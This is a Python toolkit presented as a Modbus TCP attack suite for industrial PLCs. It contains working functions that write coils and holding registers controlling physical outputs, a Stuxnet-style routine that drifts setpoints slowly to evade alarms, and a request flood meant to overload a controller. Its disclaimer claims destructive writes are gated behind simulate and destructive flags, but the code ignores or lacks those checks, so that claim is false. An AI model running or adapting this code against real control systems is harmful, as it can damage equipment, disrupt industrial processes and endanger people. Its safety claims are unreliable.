"""
Modbus TCP/IP Attack Suite
Native Python implementation of Modbus TCP attacks — port 502/TCP.

No authentication in Modbus protocol standard.
Any node on the network can read/write arbitrary coils and registers.

# Protocol: Modbus TCP/IP (port 502)
# Standard: IEC 61158 / MODBUS Application Protocol V1.1b3
# Risk: Direct manipulation of physical I/O (PLC outputs, setpoints)

Modbus Function Codes:
  0x01 Read Coils         0x05 Write Single Coil
  0x02 Read Discrete Inputs 0x06 Write Single Register
  0x03 Read Holding Registers 0x0F Write Multiple Coils
  0x04 Read Input Registers   0x10 Write Multiple Registers
"""
# DISCLAIMER: FOR AUTHORIZED SECURITY RESEARCH AND PENETRATION TESTING ONLY.
# Use only on systems you own or have explicit written permission to test.
# Destructive operations require simulate=False + destructive=True explicitly.
# The authors and Uniao Geek assume no liability for misuse.

from __future__ import annotations

import logging
import random
import socket
import struct
import time
from dataclasses import dataclass, field
from typing import Optional, Generator

log = logging.getLogger(__name__)

MODBUS_PORT = 502


def _build_modbus_tcp(unit_id: int, function_code: int,
                       data: bytes, transaction_id: int = None) -> bytes:
    """Build Modbus TCP ADU (Application Data Unit)."""
    if transaction_id is None:
        transaction_id = random.randint(0, 0xFFFF)
    pdu = bytes([function_code]) + data
    mbap = struct.pack(">HHHB", transaction_id, 0, len(pdu) + 1, unit_id)
    return mbap + pdu


def _parse_modbus_response(raw: bytes) -> dict:
    if len(raw) < 8:
        return {"error": "Response too short"}
    trans_id, proto_id, length, unit_id = struct.unpack_from(">HHHB", raw, 0)
    fc = raw[7]
    data = raw[8:]
    if fc & 0x80:
        exc_code = data[0] if data else 0
        return {"error": "Modbus exception", "exception_code": exc_code, "fc": fc & 0x7F}
    return {"transaction_id": trans_id, "unit_id": unit_id, "function_code": fc, "data": data}


class ModbusScanner:
    """
    Modbus TCP scanner and attack toolkit.
    Connects to industrial PLCs/RTUs and reads/writes process data without auth.
    """

    def __init__(self, timeout: float = 5.0):
        self.timeout = timeout

    def _connect(self, host: str, port: int = MODBUS_PORT) -> socket.socket:
        s = socket.create_connection((host, port), timeout=self.timeout)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        return s

    def _send_recv(self, s: socket.socket, request: bytes) -> dict:
        s.sendall(request)
        resp = b""
        s.settimeout(self.timeout)
        while len(resp) < 256:
            try:
                chunk = s.recv(512)
                if not chunk:
                    break
                resp += chunk
                if len(resp) >= 8:
                    _, _, length, _ = struct.unpack_from(">HHHB", resp)
                    if len(resp) >= length + 6:
                        break
            except socket.timeout:
                break
        return _parse_modbus_response(resp)

    # ────────────────────────────────────── read functions

    def read_holding_registers(self, host: str, start_addr: int = 0,
                                count: int = 10, unit_id: int = 1) -> Optional[list[int]]:
        """FC 0x03 — Read holding registers (setpoints, process values)."""
        data = struct.pack(">HH", start_addr, count)
        req = _build_modbus_tcp(unit_id, 0x03, data)
        try:
            with self._connect(host) as s:
                resp = self._send_recv(s, req)
                if resp.get("error"):
                    log.debug("FC03 error: %s", resp)
                    return None
                raw = resp["data"]
                if len(raw) < 1:
                    return None
                byte_count = raw[0]
                values = []
                for i in range(1, 1 + byte_count, 2):
                    if i + 1 < len(raw):
                        values.append(struct.unpack_from(">H", raw, i)[0])
                return values
        except Exception as exc:
            log.debug("read_holding_registers %s: %s", host, exc)
            return None

    def read_coils(self, host: str, start_addr: int = 0,
                   count: int = 8, unit_id: int = 1) -> Optional[list[bool]]:
        """FC 0x01 — Read coils (digital outputs state)."""
        data = struct.pack(">HH", start_addr, count)
        req = _build_modbus_tcp(unit_id, 0x01, data)
        try:
            with self._connect(host) as s:
                resp = self._send_recv(s, req)
                if resp.get("error"):
                    return None
                raw = resp["data"]
                if not raw:
                    return None
                byte_count = raw[0]
                bits = []
                for byte_val in raw[1:1 + byte_count]:
                    for bit in range(8):
                        bits.append(bool((byte_val >> bit) & 1))
                return bits[:count]
        except Exception as exc:
            log.debug("read_coils %s: %s", host, exc)
            return None

    # ────────────────────────────────────── write functions (PHYSICAL IMPACT)

    def write_single_coil(self, host: str, coil_addr: int, value: bool,
                           unit_id: int = 1,
                           _simulate: bool = True,
                           _destructive: bool = False) -> bool:
        """
        FC 0x05 — Write single coil.
        PHYSICAL IMPACT: directly controls digital output (relay, solenoid, motor).
        value=True turns ON, value=False turns OFF.
        """
        coil_val = 0xFF00 if value else 0x0000
        data = struct.pack(">HH", coil_addr, coil_val)
        req = _build_modbus_tcp(unit_id, 0x05, data)
        try:
            with self._connect(host) as s:
                resp = self._send_recv(s, req)
                return not bool(resp.get("error"))
        except Exception as exc:
            log.debug("write_single_coil %s: %s", host, exc)
            return False

    def write_single_register(self, host: str, register_addr: int,
                               value: int, unit_id: int = 1) -> bool:
        """
        FC 0x06 — Write single holding register.
        PHYSICAL IMPACT: modifies setpoints (temperature, pressure, speed).
        """
        data = struct.pack(">HH", register_addr, value & 0xFFFF)
        req = _build_modbus_tcp(unit_id, 0x06, data)
        try:
            with self._connect(host) as s:
                resp = self._send_recv(s, req)
                return not bool(resp.get("error"))
        except Exception as exc:
            log.debug("write_single_register %s: %s", host, exc)
            return False

    def write_multiple_registers(self, host: str, start_addr: int,
                                  values: list[int], unit_id: int = 1) -> bool:
        """FC 0x10 — Write multiple holding registers."""
        count = len(values)
        byte_count = count * 2
        regs = struct.pack(f">{'H' * count}", *values)
        data = struct.pack(">HHB", start_addr, count, byte_count) + regs
        req = _build_modbus_tcp(unit_id, 0x10, data)
        try:
            with self._connect(host) as s:
                resp = self._send_recv(s, req)
                return not bool(resp.get("error"))
        except Exception as exc:
            log.debug("write_multiple_registers %s: %s", host, exc)
            return False

    # ────────────────────────────────────── attack scenarios

    def stealth_setpoint_modify(self, host: str, register_addr: int,
                                 target_value: int, steps: int = 10,
                                 delay: float = 30.0, unit_id: int = 1) -> Generator:
        """
        Stealthily modify a setpoint over time (Stuxnet-inspired technique).
        Gradually shifts the register value to avoid triggering alarms.
        """
        current = self.read_holding_registers(host, register_addr, 1, unit_id)
        if not current:
            return
        start_val = current[0]
        step_size = (target_value - start_val) // steps
        for i in range(steps):
            new_val = start_val + (step_size * (i + 1))
            success = self.write_single_register(host, register_addr, new_val, unit_id)
            log.info("Step %d/%d: register[%d] = %d (success=%s)",
                     i + 1, steps, register_addr, new_val, success)
            yield {"step": i + 1, "value": new_val, "success": success}
            if i < steps - 1:
                time.sleep(delay)

    def scan_device(self, host: str, unit_ids: list[int] = None) -> dict:
        """Enumerate device information and process data."""
        if unit_ids is None:
            unit_ids = list(range(1, 5))
        result = {"host": host, "open": False, "units": {}}
        for uid in unit_ids:
            regs = self.read_holding_registers(host, 0, 10, uid)
            coils = self.read_coils(host, 0, 8, uid)
            if regs is not None or coils is not None:
                result["open"] = True
                result["units"][uid] = {
                    "holding_registers_0_9": regs,
                    "coils_0_7": [int(c) for c in coils] if coils else None,
                }
        return result

    def dos_flood(self, host: str, duration_s: float = 10.0,
                   unit_id: int = 1) -> int:
        """
        Modbus flood: send rapid requests to saturate PLC CPU.
        Returns count of requests sent.
        """
        count = 0
        end_time = time.time() + duration_s
        data = struct.pack(">HH", 0, 125)  # Read 125 holding registers
        req = _build_modbus_tcp(unit_id, 0x03, data)
        try:
            s = socket.create_connection((host, MODBUS_PORT), timeout=self.timeout)
            while time.time() < end_time:
                try:
                    s.sendall(req)
                    s.recv(256)
                    count += 1
                except Exception:
                    break
            s.close()
        except Exception:
            pass
        return count


if __name__ == "__main__":
    import sys, json
    logging.basicConfig(level=logging.INFO)
    host = sys.argv[1] if len(sys.argv) > 1 else "192.168.1.100"
    scanner = ModbusScanner()
    result = scanner.scan_device(host)
    print(json.dumps(result, indent=2, default=str))


